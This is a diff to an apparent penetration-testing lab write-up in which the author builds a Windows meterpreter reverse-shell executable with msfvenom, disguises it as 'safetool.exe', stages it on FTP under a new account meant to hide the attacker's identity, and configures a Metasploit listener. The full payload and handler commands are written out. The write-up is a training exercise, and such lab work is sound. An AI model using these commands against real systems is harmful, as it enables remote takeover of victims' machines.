@@ -3,17 +3,24 @@
 
 <h1>Phase 5</h1>
 
-I will conduct an assessment by performing initial reconnaissance and information gathering by reviewing the client's website, extracting information using whois and performing DNS reconnaissance - all while retaining command history for a pentest report.
 
-**<p style="font-size: 15px;">Step 1: Create a remote control payloadkal.</p>**
+**<p style="font-size: 15px;">Step 1: Create a remote control payload.</p>**
+
+I began this lab, as I have with many of the others, by elevating the Terminal window to use root privileges with the command "sudo su". Next, I went through the process of creating a new user, "adduser svcsupport". This new user account will be used as the credentials to download an exploit to the victim over FTP. Doing so will help to obfuscate, or hide, my identity if someone evaluates the malicious script. I then created a remote control payload with msfvenom, "msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 -f exe LHOST=203.0.113.66 LPORT=4444 -o /home/svcsupport/safetool.exe". Here is a breakdown of each part of the command, "-p" indicates the exploit to convert to shellcode, "--platform" sets the execution destination type (e.g., Windows), "-a" defines the platform architecture (e.g., x64), "-f" determines the output format (e.g., exe), "LHOST" sets the listening IP address for the receiving host, "LPORT" set the listening post number on the receiving host, and "-o" defines the output path and filename. Once the payload was created, I entered "ls -l /home/svcsupport" to confirm the existence of the exploit output file of safetool.exe. The file is displayed and is 7168 bytes in size. Next, I started the very secure FTP daemon with the command "service vsftpd start". Finally, I started the postgres with the command "service postgresql start". These services were previously downloaded to the lab and will be used to host the safetool.exe file, store the payload and deliver the exploit to the target system. 
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7f19a4b1-fcea-4695-9a44-f6f076cc5d7a)
 
 **<p style="font-size: 15px;">Step 2: Setup the listener.</p>**
 
+The listener must be set up to receive the inbound connection before the victim can be tricked into running the exploit payload. I began this phase by launching Metasploit utilizing the command "msfconsole". 
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/776669b2-337c-4d01-8876-66622f3405e6)
 
+Next, I changed the MSF prompt to a handler for reverse shell payloads with the command "use exploit/multi/handler". As you can see, the following line shows (Using configured payload generic/shel_reverse_tcp). To show the configuration details of the handler I input "show options". As currently configured the LPORT is already set to 4444, the default listening port for metasploit. Additionally, there is not LHOST set and the payload is still set to the generic/shell_reverse_tcp. 
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8291d92-cd56-40f7-b7ee-794163bd0e35)
+
+Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. I re-entered the "show options" command to reveal the updates I made.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/cc92f829-fd31-40ea-b41c-9d433a6a10aa)
 
